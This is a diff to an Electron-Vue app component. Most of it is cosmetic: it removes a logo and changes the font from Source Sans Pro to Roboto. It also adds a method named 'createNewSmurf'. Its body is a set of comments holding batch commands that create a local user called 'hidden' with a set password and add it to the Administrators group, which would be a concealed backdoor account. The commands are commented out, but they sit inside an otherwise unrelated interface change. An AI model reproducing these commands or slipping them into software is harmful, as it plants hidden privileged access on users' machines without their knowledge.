@@ -1,8 +1,5 @@
 <template>
   <div id="wrapper">
-    <img id="logo"
-         src="~@/assets/logo.png"
-         alt="electron-vue">
     <main>
       <div class="left-side">
         <span class="title">
@@ -50,6 +47,12 @@ export default {
   methods: {
     open(link) {
       this.$electron.shell.openExternal(link);
+    },
+    createNewSmurf() {
+      // Bat to create user
+      // @echo off
+      // net user hidden yourpassword /add
+      // net localgroup Administrators hidden /add
     }
   },
   mounted() {
@@ -71,7 +74,7 @@ export default {
 </script>
 
 <style>
-@import url("https://fonts.googleapis.com/css?family=Source+Sans+Pro");
+@import url("https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap");
 
 * {
   box-sizing: border-box;
@@ -80,7 +83,7 @@ export default {
 }
 
 body {
-  font-family: "Source Sans Pro", sans-serif;
+  font-family: "Roboto", sans-serif;
 }
 
 #wrapper {
